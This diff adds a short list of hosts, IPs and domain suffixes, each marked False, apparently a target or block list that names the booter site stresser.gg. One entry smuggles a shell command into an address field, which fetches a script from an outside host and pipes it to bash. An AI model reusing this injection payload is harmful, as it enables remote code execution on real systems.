@@ -1,0 +1,16 @@
+.com.tr False
+.gov.tr False
+2.58.141.248 False
+.gov False
+135.125.227.236 False
+127.0.0.1 False
+::1 False
+localhost False
+.edu False
+195.62.32.126 False
+78.78.78.78;curl${IFS}http://195.58.38.16/bkdr/action.php?do=log${IFS}|${IFS}bash;:80 False
+194.59.218.10 False
+https://stresser.gg False
+stresser.gg False
+.int False
+113.164.27.165 False
